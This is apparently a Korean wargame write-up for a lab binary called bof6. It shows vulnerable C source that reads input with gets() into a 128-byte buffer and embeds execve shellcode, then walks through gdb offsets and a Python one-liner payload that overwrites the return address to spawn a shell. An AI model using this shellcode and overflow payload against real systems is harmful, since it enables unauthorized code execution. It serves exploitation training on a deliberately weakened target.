# bof6 정리

## bof6.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON


void vuln() {
    char buf[BUF_SIZE];
    char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

    printf("[shellcode:%p]\n", shellcode);
    gets(buf);
    printf("Hello %s!\n", buf);

    if (setreuid(1006, 1006)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1006, 1006)) {
        perror("setgid");
        exit(1);
    }
}

int main() {
    vuln();
    return 0;
}
```

코드를 보면 `gets` 함수가 취약한 것을 알 수 있다.

---

## 공격 기법

`gets`를 통해 `buf`에 Return Address 전까지 Dummy 값을 채워 `vuln` 함수의 Return Address를 `shellcode`를 가리키는 주소를 넣어 공격할 것이다. 즉, 일종의 Ret-sled 기법을 사용한다.

---

## 방법

![bof6_1](img/bof6_1.png)

`vuln`함수에 breakpoint를 건 후, `rsp` 레지스터가 담고 있는 주소값을 확인한다.

이 주소는 `vuln` 함수의 Return Address 이다.

![bof6_2](img/bof6_2.png)

`gets`함수에 breakpoint를 건 후, `rdi` 레지스터가 담고 있는 주소값을 확인한다.

이 주소는 `buf` 변수의 주소 이다.

![bof6_3](img/bof6_3.png)

`shellcode`변수의 주소값을 `./bof6`를 실행시켜 확인한다. 여러번 실행해 주소값이 바뀌지 않는지 확인한다.

![bof6_4](img/bof6_4.png)

```shell
$ (python -c 'print "a"*136+"\x30\xeb\xff\xff\xff\x7f"'; cat) | ./bof6
```

전에 나온 것을 종합해 payload, 공격 구문을 작성해 입력하면 위와 같이 shell을 따올 수 있음을 확인할 수 있다.